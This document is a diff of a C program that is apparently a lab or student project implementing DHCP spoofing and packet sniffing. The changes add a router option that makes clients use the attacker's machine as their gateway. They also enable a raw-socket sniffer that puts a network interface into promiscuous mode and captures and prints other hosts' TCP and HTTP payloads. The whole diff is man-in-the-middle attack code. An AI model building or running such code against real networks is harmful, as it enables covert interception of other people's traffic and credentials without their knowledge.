@@ -13,8 +13,10 @@
 #include <stdarg.h>
 #include <sys/types.h>
 #include <ifaddrs.h>
-#include<netinet/tcp.h>
-#include<netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/ip.h>
+#include <pthread.h>
+#include <sys/ioctl.h>
 
 #include "dhcp.h"
 
@@ -23,7 +25,7 @@ int verbose_mode = 0;
 struct in_addr my_ip;
 struct in_addr brd_addr;
 struct in_addr sub_addr;
-uint8_t srv_hst_name[] = "NOT A ROUTER";
+uint8_t srv_hst_name[] = "NOT-A-ROUTER";
 
 /// Always use this print, which is only enabled when verbose mode is enabled.
 void d_printf(char* format, ...) {
@@ -101,7 +103,7 @@ void deinit(void) {
 }
 
 /// This should perform the DHCP Spoofing
-void init_DHCP_server() {
+void init_DHCP_server(void* arg) {
 	
 	d_printf("DHCP Init\n");
 	
@@ -137,7 +139,7 @@ void init_DHCP_server() {
 				o_hdr.num_s = 0;		
 				o_hdr.flags = i_hdr.flags;	// Flags from the client
 				o_hdr.clt_ip = 0;		
-				o_hdr.own_ip = inet_addr("10.32.143.232"); // Static Value for Now
+				o_hdr.own_ip = inet_addr("10.32.143.20"); // Static Value for Now
 				o_hdr.srv_ip = my_ip.s_addr;
 				o_hdr.gtw_ip = my_ip.s_addr;
 				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
@@ -173,7 +175,7 @@ void init_DHCP_server() {
 				o_hdr.num_s = 0;
 				o_hdr.flags = i_hdr.flags;	// Flags from the client
 				o_hdr.clt_ip = i_hdr.clt_ip;
-				o_hdr.own_ip = inet_addr("10.32.143.232");
+				o_hdr.own_ip = inet_addr("10.32.143.20");
 				o_hdr.srv_ip = my_ip.s_addr;
 				o_hdr.gtw_ip = my_ip.s_addr;
 				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
@@ -184,16 +186,17 @@ void init_DHCP_server() {
 				o_opt.dhcp_msg = ACK;		
 				o_opt.ip_lease_time = 10000;
 				memcpy(o_opt.srv_id, &my_ip.s_addr, IP_ADDR_L);
+				memcpy(o_opt.rtr_id, o_opt.srv_id, IP_ADDR_L);
 				memcpy(o_opt.sub_msk, &sub_addr.s_addr, IP_ADDR_L);
 				o_opt.rnw_time = 10000;
 				o_opt.rbn_time = 10000;
 
 				// Gather the flags from the header
 				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);
-			
+				
 				// Sends the package
 				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);
-
+				
 				d_printf("Request\n");
 				break;
 			case DECLINE:
@@ -272,8 +275,8 @@ int is_a_valid_history(unsigned char *http, int data_size) {
 //Wait for incoming HTTP packets
 int wait_http_packet(int sock_raw, unsigned char *buffer, int *data_size) {
 	printf("wait_http_packet\n");
-	struct sockaddr saddr;
-	int saddr_size = sizeof(saddr);
+	//struct sockaddr saddr;
+	//int saddr_size = sizeof(saddr);
 	
 	memset(buffer, 0, sizeof(*buffer));
 
@@ -285,7 +288,7 @@ int wait_http_packet(int sock_raw, unsigned char *buffer, int *data_size) {
 	do {
 		//Receive a packet
 		printf("waiting a packet...\n");
-		*data_size = recvfrom(sock_raw, buffer, 65536, 0, &saddr, &saddr_size);
+		*data_size = recvfrom(sock_raw, buffer, 65536, 0, NULL, NULL);//&saddr, &saddr_size);
 		printf("received\n");
 		if (*data_size < 0)
 			//Return in an error occur
@@ -296,9 +299,11 @@ int wait_http_packet(int sock_raw, unsigned char *buffer, int *data_size) {
     		iphdrlen = iph->ihl*4;
 		memset(&source, 0, sizeof(source));
 		source.sin_addr.s_addr = iph->saddr;
+
+		print_payload(buffer, *data_size);
 	}
 	//Check if the packet has any HTTP info
-	while (!(iph->protocol == 6 && tcph->doff > 0));
+	while (!(iph->protocol == 6/*&& tcph->doff > 0*/));
 
 	printf("A TCP packet was found and it has some content\n");
 	printf("Source IP: %s\n", inet_ntoa(source.sin_addr));
@@ -314,6 +319,7 @@ int wait_http_packet(int sock_raw, unsigned char *buffer, int *data_size) {
 void init_sniffer() {
 	int sock_raw, data_size, http;
 	unsigned char *buffer = (unsigned char *)malloc(65536);
+	struct ifreq interfaceFlags;
 
 	//Create a raw socket that shall sniff
 	sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -321,6 +327,21 @@ void init_sniffer() {
         	printf("Socket Error\n");
         	return;
     	}
+
+	strncpy(interfaceFlags.ifr_name, "enp4s0", IFNAMSIZ-1);
+
+	/// Gets the initial flags for the interface
+	if(ioctl(sock_raw, SIOCGIFFLAGS, &interfaceFlags) < 0 ) {
+		perror("Error in interface flags obtainance");
+		return;
+	}
+
+        // Sets the interface to promiscuos
+        interfaceFlags.ifr_flags |= IFF_PROMISC;
+        if(ioctl(sock_raw, SIOCSIFFLAGS, &interfaceFlags) < 0) {
+                perror("Error while setting interface to promiscuos");
+                return;
+        }
 
 	while((http = wait_http_packet(sock_raw, buffer, &data_size)))
 		if (is_a_valid_history(buffer, data_size))
@@ -340,9 +361,15 @@ int main(int argc, char** argv) {
 	// Register exit function
 	atexit(deinit);	
 	
-	init_DHCP_server();
+	/*pthread_t thread;
+
+	if( pthread_create(&thread, NULL, &init_DHCP_server, NULL) != 0 ) {
 	
-	//init_sniffer();
+		d_printf("Deu Merda\n");
+	
+	}*/	
+
+	init_sniffer();
 
 	// End of program
 	exit(EXIT_SUCCESS);
